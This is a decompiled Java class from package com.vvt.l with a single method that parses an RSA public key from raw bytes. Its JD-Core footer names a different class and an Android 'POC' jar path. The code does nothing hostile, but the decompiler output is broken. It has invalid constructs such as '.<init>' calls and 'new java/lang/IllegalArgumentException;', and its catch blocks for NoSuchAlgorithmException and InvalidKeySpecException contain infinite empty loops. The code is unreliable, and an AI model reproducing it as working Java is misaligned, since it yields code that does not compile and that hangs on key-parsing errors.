package com.vvt.l;

import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;

public class g
{
  public static RSAPublicKey a(byte[] paramArrayOfByte)
  {
    if (paramArrayOfByte == null)
    {
      localObject1 = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject1).<init>("input key data is null");
      throw ((Throwable)localObject1);
    }
    Object localObject1 = "RSA";
    try
    {
      localObject1 = KeyFactory.getInstance((String)localObject1);
      X509EncodedKeySpec localX509EncodedKeySpec = new java/security/spec/X509EncodedKeySpec;
      localX509EncodedKeySpec.<init>(paramArrayOfByte);
      localObject1 = ((KeyFactory)localObject1).generatePublic(localX509EncodedKeySpec);
      localObject1 = (RSAPublicKey)localObject1;
    }
    catch (NoSuchAlgorithmException localNoSuchAlgorithmException)
    {
      for (;;)
      {
        Object localObject2 = null;
      }
    }
    catch (InvalidKeySpecException localInvalidKeySpecException)
    {
      for (;;)
      {
        Object localObject3 = null;
      }
    }
    return (RSAPublicKey)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/l/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */